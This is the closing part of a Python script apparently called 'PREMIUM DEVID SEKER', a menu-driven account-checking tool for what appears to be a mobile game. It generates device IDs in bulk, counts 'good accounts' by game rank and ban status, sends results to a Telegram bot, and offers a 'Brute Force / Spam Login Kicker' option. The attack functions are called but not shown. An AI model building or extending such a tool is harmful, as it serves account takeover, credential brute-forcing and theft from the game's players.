def show_stats():
    print_header("📊 STATISTICS")
    with COUNTER_LOCK:
        print(f"{Fore.CYAN}Rank Distribution:{Style.RESET_ALL}")
        for rank in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic']:
            count = HIT_COUNTERS.get(rank, 0)
            color = Fore.MAGENTA if rank == 'mythic' else Fore.CYAN if rank == 'legend' else Fore.WHITE
            print(f"  {rank.capitalize():<12}: {color}{count:,}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}V2L Status:{Style.RESET_ALL}")
        print(f"  Active    : {Fore.GREEN}{HIT_COUNTERS.get('v2l_active', 0):,}{Style.RESET_ALL}")
        print(f"  Inactive  : {Fore.YELLOW}{HIT_COUNTERS.get('v2l_inactive', 0):,}{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}Special:{Style.RESET_ALL}")
        print(f"  Sultan    : {Fore.YELLOW}{HIT_COUNTERS.get('sultan', 0):,}{Style.RESET_ALL}")
        print(f"  HighRank  : {Fore.MAGENTA}{HIT_COUNTERS.get('highrank', 0):,}{Style.RESET_ALL}")
        print(f"  Banned    : {Fore.RED}{HIT_COUNTERS.get('banned', 0):,}{Style.RESET_ALL}")
        
        total = sum(HIT_COUNTERS.get(r, 0) for r in ['warrior', 'elite', 'master', 'gm', 'epic', 'legend', 'mythic'])
        if total > 0:
            print(f"\n{Fore.CYAN}Total Good Accounts: {Fore.GREEN}{total:,}{Style.RESET_ALL}")
    
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def run_cleanup():
    import shutil
    print_header("🗑️ CLEAN OUTPUT FILES")
    print(f"{Fore.YELLOW}WARNING: This will delete all output files in {OUTPUT_DIR}{Style.RESET_ALL}")
    confirm = input(f"{Fore.RED}Are you sure? (y/n): {Style.RESET_ALL}").strip().lower()
    if confirm == 'y':
        shutil.rmtree(OUTPUT_DIR)
        ensure_dirs()
        print(f"{Fore.GREEN}✓ Output cleaned!{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def test_telegram():
    print_header("📨 TEST TELEGRAM")
    if not TELEGRAM_BOT_TOKEN or TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print(f"{Fore.RED}Please set TELEGRAM_BOT_TOKEN in the script first!{Style.RESET_ALL}")
        input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}Sending test message to Telegram...{Style.RESET_ALL}")
    test_msg = (
        f"🔔 <b>PREMIUM DEVID SEKER</b>\n"
        f"✅ Telegram connected successfully!\n"
        f"⏰ Test notification working.\n\n"
        f"✨ <b>Created by:</b> @Markie678"
    )
    success = send_telegram(test_msg)
    if success:
        print(f"{Fore.GREEN}✓ Test message sent successfully!{Style.RESET_ALL}")
    else:
        print(f"{Fore.RED}✗ Failed to send. Check your token and chat ID.{Style.RESET_ALL}")
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def run_generator_menu():
    print_header("🔨 GENERATE DEVICE IDS")
    size = input(f"{Fore.CYAN}Size in MB (default 10): {Style.RESET_ALL}").strip()
    size = float(size) if size else 10.0
    threads = input(f"{Fore.CYAN}Threads (default 16): {Style.RESET_ALL}").strip()
    threads = int(threads) if threads else 16
    run_generator(size, threads)
    input(f"\n{Fore.CYAN}Press Enter to continue...{Style.RESET_ALL}")

def main():
    ensure_dirs()
    while True:
        print_header("🔥 PREMIUM DEVID SEKER 🔥")
        print(f"{Fore.YELLOW}[1]{Style.RESET_ALL} Generate Device IDs")
        print(f"{Fore.YELLOW}[2]{Style.RESET_ALL} Premium Bulk Check (8-REQ)")
        print(f"{Fore.YELLOW}[3]{Style.RESET_ALL} Show Statistics")
        print(f"{Fore.YELLOW}[4]{Style.RESET_ALL} Clean Output Files")
        print(f"{Fore.YELLOW}[5]{Style.RESET_ALL} Test Telegram")
        print(f"{Fore.YELLOW}[6]{Style.RESET_ALL} ⚡ Brute Force / Spam Login Kicker")
        print(f"{Fore.YELLOW}[7]{Style.RESET_ALL} 🔍 Single Account Check (8-REQ Full)")
        print(f"{Fore.YELLOW}[0]{Style.RESET_ALL} Exit\n")
        
        choice = input(f"{Fore.CYAN}Choose (0-7): {Style.RESET_ALL}").strip()
        
        if choice == '0':
            print(f"\n{Fore.GREEN}Goodbye! - Created by @Markie678{Style.RESET_ALL}")
            break
        elif choice == '1':
            run_generator_menu()
        elif choice == '2':
            run_bulk_detail()
        elif choice == '3':
            show_stats()
        elif choice == '4':
            run_cleanup()
        elif choice == '5':
            test_telegram()
        elif choice == '6':
            run_bruteforce_login()
        elif choice == '7':
            run_single_check()
        else:
            print(f"{Fore.RED}Invalid choice.{Style.RESET_ALL}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Fore.YELLOW}Stopped by user.{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}Error: {e}{Style.RESET_ALL}")
        import traceback
        traceback.print_exc()